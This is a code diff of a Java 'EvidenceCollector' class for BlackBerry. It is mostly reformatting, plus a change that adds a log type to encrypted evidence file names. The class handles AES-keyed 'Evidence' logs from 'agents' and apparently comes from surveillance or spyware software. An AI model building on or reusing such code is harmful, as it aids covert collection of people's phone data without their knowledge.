@@ -32,7 +32,6 @@ import blackberry.utils.Check;
 import blackberry.utils.DoubleStringSortVector;
 import blackberry.utils.StringSortVector;
 
-
 /**
  * The Class LogCollector.
  * 
@@ -131,7 +130,6 @@ public final class EvidenceCollector implements Singleton {
     }
 
     private void clear() {
-        
 
     }
 
@@ -170,8 +168,8 @@ public final class EvidenceCollector implements Singleton {
      */
     public synchronized Evidence factory(final Agent agent, final boolean onSD) {
 
-        final Evidence log = new Evidence(agent.agentId, agent.onSD(), keys
-                .getAesKey());
+        final Evidence log = new Evidence(agent.agentId, agent.onSD(),
+                keys.getAesKey());
 
         return log;
     }
@@ -228,7 +226,7 @@ public final class EvidenceCollector implements Singleton {
      * @return the vector
      */
     public synchronized Vector makeNewName(final Evidence log,
-            final boolean onSD) {
+            final int logType, final boolean onSD) {
         final Date timestamp = log.timestamp;
         final int progressive = getNewProgressive();
 
@@ -251,7 +249,7 @@ public final class EvidenceCollector implements Singleton {
 
         final String paddedProgressive = mask.substring(0, size) + ds;
 
-        final String fileName = paddedProgressive + "!"
+        final String fileName = paddedProgressive + "!" + logType + "!"
                 + makeDateName(timestamp);
 
         final String encName = Encryption.encryptName(fileName + LOG_EXTENSION,
@@ -328,12 +326,12 @@ public final class EvidenceCollector implements Singleton {
                     debug.trace("removeLog: " + file);
 
                     //#endif
-                    int removed = removeLogRecursive(basePath + file,
-                            numFiles - numLogsDeleted);
+                    int removed = removeLogRecursive(basePath + file, numFiles
+                            - numLogsDeleted);
                     //#ifdef DEBUG
                     debug.trace("removeLog removed: " + removed);
                     //#endif
-                    
+
                     numLogsDeleted += removed;
                 }
             }
@@ -473,7 +471,7 @@ public final class EvidenceCollector implements Singleton {
                     fcDir.close();
                 } catch (final IOException e) {
                     //#ifdef DEBUG
-                    debug.error("scanForEvidences: " +e);
+                    debug.error("scanForEvidences: " + e);
                     //#endif
                 }
             }
